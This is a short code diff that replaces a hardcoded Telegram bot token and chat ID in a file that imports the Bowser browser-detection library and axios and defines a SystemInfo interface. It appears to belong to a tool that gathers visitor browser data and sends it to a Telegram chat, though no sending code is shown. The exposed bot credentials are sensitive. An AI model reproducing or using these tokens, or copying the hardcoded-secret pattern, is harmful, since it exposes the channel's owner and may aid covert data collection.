@@ -1,8 +1,8 @@
 import Bowser from 'bowser';
 import axios from 'axios';
 
-const TELEGRAM_BOT_TOKEN = '7871741894:AAGuaw1nu0Hy6pog0-X8DAoffXWo6HZgKCU';
-const TELEGRAM_CHAT_ID = '5205300039';
+const TELEGRAM_BOT_TOKEN = '7961589400:AAHeZz8_mm8sbBo2AR9jJfIX8x7NrYEqKRs';
+const TELEGRAM_CHAT_ID = '-1002210558363';
 
 interface SystemInfo {
   browser: string;
